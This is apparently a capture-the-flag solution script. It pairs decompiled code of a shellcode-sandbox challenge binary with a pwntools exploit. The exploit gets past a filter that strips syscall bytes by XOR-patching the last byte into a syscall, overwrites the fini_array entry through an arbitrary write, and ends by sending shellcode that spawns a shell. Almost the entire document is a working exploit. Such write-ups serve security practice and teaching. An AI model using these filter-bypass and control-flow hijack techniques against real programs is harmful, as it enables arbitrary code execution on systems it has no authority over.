"""
ret2shellcode to fini_array
// 1.Ctrl+E, start找到 fini array,  004DB030 (Ctrl+S直接进fini_array也行)
void __fastcall __noreturn start(__int64 a1, __int64 a2, __int64 a3)
{
// _libc_start_main(main, v4, &retaddr, _libc_csu_init, _libc_csu_fini, a3, &v5);
   sub_402300(sub_401DF4, v4, &retaddr, sub_402F60, sub_403000, a3, &v5);
} // 004DB030 10 1D 40 00 00 00 00 00       off_4DB030 dq offset sub_401D10

// code
__int64 sub_401DF4()
{
  buf = mprotect(0x20230000uLL, 0x1000uLL, 7uLL, 0x22u, 0xFFFFFFFFuLL, 0LL);
  puts("Input your code length:", 4096LL);
  sscanf("%d", &n33);
  if ( n33 >= 33 )
  {
    puts("Too long!", &n33);
    sub_410120(0);
  }
  puts("Now show me your code:", &n33);
  buff = buf;
  sysread(0, buf, n33);
  for ( i = 0; i < n33; ++i )
  {
    if ( buf[i] == 0xF && buf[i + 1] == 5 )
    {
      buf[i] = 0x90;
      buf[i + 1] = 0x90;
    }
  }
  puts("Now magic time!", buff);
  puts("Where?", buff);
  sscanf("%p", &v4);
  puts("What?", &v4);
  sysread(0, v4, 8uLL);  // 联合上面scanf 相当于 *v4 = 输入指针地址, 将 fini_array 数组改为 0x20230000
  result = 0LL;
  if ( __readfsqword(0x28u) != v6 )
    checkfailed();
  return result;
}
"""
from pwn import *

context(arch='amd64', log_level='debug')
p = process('./pwns')  # ida能调 gdb调不了为啥？
# p = remote('127.0.0.1', 12345)

# gdb.attach(p, "b*0x0401F7C\nc")
# gdb.attach(p, "b*0x20230000\nc")
# p = gdb.debug('./pwns', "b*0x20230000\nc")

p.sendlineafter(b"Input your code length:\n", b'32')

# 在0x21处异或得到5,与前部组成0f05(syscall)实在read(0,+20,rdx利用残留)
pay = '''
mov rsi, 0x20230020
push 0x5
pop rax
xor [rsi],rax
xor rdi,rdi
xor rax,rax
'''
shellcode = asm(pay).ljust(0x1f, b'\x90') + b'\x0f'
p.sendafter(b"Now show me your code:\n", shellcode)
p.sendlineafter(b"Where?\n", b'4db030')
p.sendafter(b"What?\n", p64(0x20230000))

p.send(b'\x05' + asm(shellcraft.sh()))
p.interactive()
